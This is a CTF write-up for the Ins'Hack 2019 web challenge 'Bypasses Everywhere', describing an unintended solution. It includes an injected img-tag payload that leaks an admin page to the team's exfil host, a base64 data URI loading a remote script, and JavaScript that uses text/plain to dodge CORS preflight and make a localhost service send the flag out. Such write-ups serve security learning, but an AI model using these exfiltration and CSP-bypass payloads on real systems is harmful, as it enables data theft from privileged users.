---
layout: post
title:  "Ins'Hack 2019 - Bypasses Everywhere"
date:   2019-05-07 13:37
categories: [InsHack2019]
tags: [Web]
author: jbz
---

The challenge description was minimal:
```
I’m selling very valuable stuff for a reasonable amount of money (for me 
at least). Go check it out!

https://bypasses-everywhere.ctf.insecurity-insa.fr
```

### TL;DR ###

This writeup is about our uninteded solution of a very cool Web 
challenge by [Hugo DELVAL](https://twitter.com/HugoDelval).
The intended solution was about triggering an XSS and bypass the CSP via 
a JSONP endpoint on www.google.com.
Our solution abused the `data:[<mediatype>][;base64],<data>` URIs to get 
JavaScript execution.
The intended solution can be found 
[here](https://github.com/InsecurityAsso/inshack-2019/blob/master/bypasses-everywhere/writeup.md) 
and 
[here](https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere).

### Recon ###

The target website was basically made of 2 pages:
 - `/article` where you can view articles and you have a bunch of XSSes
 - `/admin` where you can send a link to the admin and you have an XSS 
when the link is visited

The various pages were protected with a pretty strict `CSP`:
```
Content-Security-Policy: script-src www.google.com; img-src *; 
default-src 'none'; style-src 'unsafe-inline'
```

### Admin's browser ###

By sending a simple HTTP link to the admin you're able to notice that 
his browser is `HeadlessChrome/73`, meaning we have to deal no only with 
the `CSP`, but also with the `XSS-Auditor`.

```
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, 
like Gecko) HeadlessChrome/73.0.3683.75 Safari/537.36
```

### Leaking admin's page ###

In the admin page there was the following text, just after the url 
`input` field:
```
I'm usually connecting to this page using http://127.0.0.1:8080, so I'm 
pretty sure this page is safe :)
```
So we thought we had a way to leak somehow the content of that page, 
without breaking the `CSP` and triggering the `XSS-Auditor`.

Finally we managed to do it by injecting a new `<img>` tag with as 
source our domain, followed by the page's content.

We basically sent as URL to the admin:
`http://127.0.0.1:8080/admin?url=c"><img src='https://exfil.jbz.team/a`

The browser was so nice to close the `src` attribute once he found the 
`'` in the `I'm usualy ...` text and sent us the page's content in the 
request's path, which after some beautifying resulted in:

```
from flask import request, render_template
from flask_csp.csp import csp_header
import requests
import re

with open("flag.txt") as f:
    FLAG = f.read()
def _local_access() -> bool:
    if request.referrer is not None and not 
re.match(r"^http://127\.0\.0\.1(:/d+)?/", request.referrer):
        return False
    return request.remote_addr == "127.0.0.1"
def routes(app, csp):
    @csp_header(csp)
    @app.route("/admin")
    def adm():
        url = request.args.get("picture")
        if _local_access():
            with open(__file__) as f:
                code = f.read()
        else:
            code = None
        return render_template("admin.html", url=url, code=code)
    @csp_header(csp)
    @app.route("/article", methods = ["POST"])
    def secret():
        try:
            assert _local_access()
            data = request.get_json(force=True)
            assert data["secret"] == "No one will never ever access this 
beauty"
            requests.post(data["url"], data={
                "flg": FLAG,
            }, timeout=2)
            return "yeah!"
        except Exception as e:
            app.logger.error(e)
            return
```

### Bypassing ~~everything~~ and getting the ~~FLAG~~ ###

The leaked code is pretty trivial, what is needed to do to get the flag 
is:
 - Sending a `POST` request to `/article` with a specific `secret` and 
the `url` where we will receive the `flag`
 - The request must be sent by the `admin` as his IP is `127.0.0.1`
 - If a referrer is set it must be `127.0.0.1[:port]`
 
After some brainstorming we realized that the solution was as easy as 
submitting a [data 
URI](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs) 
to the admin.

We've build a `data` URI which injected some `JavaScript` in a blank 
page and submitted the required request without a referrer and finally 
we received the ~~flag~~.

**Data URI**
```
data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygxKTwvc2NyaXB0PjxzY3JpcHQgc3JjPSJodHRwOi8vamJ6LnRlYW06ODA4MC9hLmpzIj48L3NjcmlwdD4=
```

**a.js**
```
x=new XMLHttpRequest();
x.open("POST","http://127.0.0.1:8080/article");
x.setRequestHeader("Content-Type", "application/json");
x.send(JSON.stringify({"secret":"No one will never ever access this 
beauty","url":"http://exfil.jbz.team/"}));
```

We received no `FLAG` and after some debugging we realized that the 
browser was trying to send a `preflight` request as the `Content-Type` 
was set to `application/json`, which was obviously failing as the server 
was not responding with the required `Allowing-*` headers.

### Last but not least bypass and (finally) FLAG ###

How can we send a `json` request without sending a `json` request?

We went back to the source code and noticed the `data = 
request.get_json(force=True)` line, which brought us to [Flask's 
documentation](http://flask.pocoo.org/docs/1.0/api/#flask.Request.get_json):
```
Parse and return the data as JSON. If the mimetype does not indicate 
JSON (application/json, see is_json()), this returns None unless force 
is true.
```

So we can just set as `Content-Type` anything which does not trigger the 
`preflight` mechanism? Let's try!

**new a.js**
```
x=new XMLHttpRequest();
x.open("POST","http://127.0.0.1:8080/article");
x.setRequestHeader("Content-Type", "text/plain");
x.send(JSON.stringify({"secret":"No one will never ever access this 
beauty","url":"http://exfil.jbz.team/"}));
```

And BOOM, we received the `FLAG` via `POST` to 
`https://exfil.jbz.team/`!

`Flag: 
flg=INSA{f330a6678b14df79b05f63040537b384e4c87c87525de8d396b43250988bdfaa}`
